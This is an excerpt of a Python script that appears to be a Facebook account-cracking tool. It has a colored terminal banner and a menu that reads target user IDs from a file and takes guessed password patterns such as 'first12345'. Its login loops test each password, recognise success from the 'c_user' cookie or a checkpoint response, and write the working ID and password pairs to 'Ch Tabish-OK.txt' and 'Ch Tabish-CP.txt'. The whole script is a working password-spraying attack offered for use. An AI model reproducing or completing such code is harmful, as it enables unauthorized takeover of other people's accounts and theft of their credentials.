...
\033[0;37m   |  _  |  |  | __  |   __|
\033[0;37m   |   __|  |  | __ -|  |  |
\033[0;37m   |__|  |_____|_____|_____|\033[0;32m𝘾𝙃
\033[1;97m----------------------------------------------\033[1;97m
...
\033[1;97m----------------------------------------------\033[1;97m
  ...
  \033[0;97m[√] 𝙑𝙀𝙍𝙎i𝙊𝙉   :\033[1;31m A.179
\033[1;97m----------------------------------------------\033[1;37m""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/Tabish.txt')
				linex()
				...
				os.system('clear')
				print(logo)
				print(' Example : firstlast,first last,first12345,***Etc')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				os.system('clear')
				print(logo)
				print(' Do you want Show cp  : ')
				linex()
				cx=input(' Choose: ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97m𝘾𝙃•••••\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[Ch Tabish-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Ch Tabish-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[Ch Tabish-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Ch Tabish-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mCh Tabish\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[Ch Tabish-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Ch Tabish-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[Ch Tabish-OK] '+cid+' | '+ps+'\033[1;32m')
				open('Ch Tabish-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Ch Tabish-CP] '+cid+' | '+ps+'\33[0;97m')
				open('Ch Tabish-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
